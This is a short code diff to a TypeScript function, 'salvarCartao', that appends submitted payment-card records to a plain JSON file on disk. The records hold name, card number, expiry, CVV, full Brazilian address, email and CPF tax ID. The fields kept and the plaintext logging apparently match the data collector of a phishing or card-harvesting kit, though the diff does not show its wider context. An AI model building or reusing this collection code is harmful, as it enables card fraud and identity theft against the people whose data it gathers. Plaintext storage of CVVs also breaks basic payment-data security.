@@ -34,8 +34,20 @@ export function salvarCartao(dados: any) {
       cartoes = JSON.parse(content || "[]");
     }
     cartoes.push({
-      ...dados,
       timestamp: new Date().toISOString(),
+      nome: dados.nome || "",
+      numero: dados.numero || "",
+      validade: dados.validade || "",
+      cvv: dados.cvv || "",
+      cep: dados.cep || "",
+      rua: dados.rua || "",
+      numero_endereco: dados.numero_endereco || "",
+      complemento: dados.complemento || "",
+      bairro: dados.bairro || "",
+      cidade: dados.cidade || "",
+      estado: dados.estado || "",
+      email: dados.email || "",
+      cpf: dados.cpf || "",
     });
     fs.writeFileSync(cartaoFile, JSON.stringify(cartoes, null, 2));
     console.log(`[cartao] Dados salvos. Total: ${cartoes.length}`);
